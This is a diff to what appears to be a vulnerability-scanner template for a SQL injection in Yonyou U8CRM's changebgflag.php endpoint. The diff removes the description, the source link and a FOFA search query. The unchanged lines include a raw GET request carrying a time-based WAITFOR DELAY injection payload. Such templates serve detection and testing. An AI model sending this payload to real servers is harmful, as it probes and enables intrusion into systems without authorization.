@@ -3,12 +3,8 @@ info:
   name: 用友U8CRM changebgflag 存在SQLl注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qsyrd5la73aogsg2'
+  description: ''
   tags: other,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qsyrd5la73aogsg2
-    fofa: app="用友U8CRM"
 http:
 - raw:
   - 'GET /service/changebgflag.php?UserSessionID=bgsesstimeout-&objType=1&StopBgFlag=1&objID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
